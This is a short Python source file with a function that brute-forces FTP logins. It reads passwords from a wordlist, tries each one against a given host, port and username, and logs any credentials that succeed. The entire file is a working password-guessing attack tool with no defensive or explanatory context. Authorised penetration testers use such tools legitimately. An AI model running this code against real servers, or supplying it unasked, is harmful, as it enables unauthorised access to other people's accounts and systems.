from ftplib import FTP

def start_ftp_brute(host, port, user, wordlist_path, verbose, logger):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            try:
                ftp = FTP()
                ftp.connect(host, int(port), timeout=3)
                ftp.login(user, password)
                logger(f"[+] SUCCESS: {user}:{password}")
                ftp.quit()
                return
            except Exception as e:
                if verbose:
                    logger(f"[-] Tried {user}:{password} - {e}")
    logger("[-] FTP brute-force finished.")
